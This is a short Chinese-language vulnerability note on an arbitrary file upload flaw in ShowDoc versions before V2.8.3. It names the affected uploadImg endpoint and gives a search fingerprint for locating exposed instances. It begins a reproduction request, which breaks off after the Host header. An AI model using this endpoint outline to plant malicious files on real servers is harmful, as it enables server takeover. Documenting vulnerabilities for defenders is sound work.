ShowDoc PageController.class.php 任意文件上传漏洞¶

漏洞描述¶

ShowDoc 存在任意文件上传漏洞，攻击者通过构造特殊的数据包可以上传恶意文件控制服务器

漏洞影响¶

ShowDoc < V2.8.3

网络测绘¶

app="ShowDoc"

漏洞复现¶

网站首页如下

构造如下数据包上传php文件

POST /index.php?s=/home/page/uploadImg HTTP/1.1
Host: xxx.xxx.xxx.xxx
